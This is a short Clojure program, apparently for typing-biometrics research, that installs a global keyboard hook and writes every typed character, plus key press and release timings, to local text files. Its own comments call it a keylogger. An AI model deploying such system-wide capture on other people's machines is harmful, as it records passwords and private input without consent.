(ns typing-biometrics.core
  (:gen-class)
  ;(:import java.awt.event.KeyEvent)
  (:import org.jnativehook.GlobalScreen)
  (:import org.jnativehook.keyboard.NativeKeyListener)
  (:require [clojure.java.io :as io]))

(defn write [q] ;; keylogger
  (with-open [w (io/writer "C:\\Users\\Bresko\\Desktop\\temp.txt" :append true)]
    (.write w (str q))))

(defn write2 [a b ms] ;; [keyBefore currentKey] timeKeyPressed timeBeforeLastTwoKeysPressed
  (with-open [w (io/writer (str "C:\\Users\\Bresko\\Desktop\\temp2.txt") :append true)]
    (.write w (str a ";" b ";" ms "\n"))))


(defn key-action [e action]
  (with-open [w (io/writer "C:\\Users\\Bresko\\Desktop\\temp2.txt" :append true)]
    (.write w (str action ";" (.getRawCode e) ";" (System/currentTimeMillis) "\n"))))



(defn key-typed [e] ;; keylogger
  (let [k (.getKeyChar e)]
    (write k)))



(defn myGlobalKeyListener []
  (reify
    NativeKeyListener
    (nativeKeyPressed [this event] (key-action event "key-pressed")) ;;button pressed and time
    (nativeKeyReleased [this event] (key-action event "key-released")) ;;button released and time
    (nativeKeyTyped [this event] (key-typed event)))) ;; standard keylogger

(defn mainMethod []
  (GlobalScreen/registerNativeHook)
  (.addNativeKeyListener (GlobalScreen/getInstance) (myGlobalKeyListener))
  (println "keylogger started"))

(defn -main [& args]
  (mainMethod))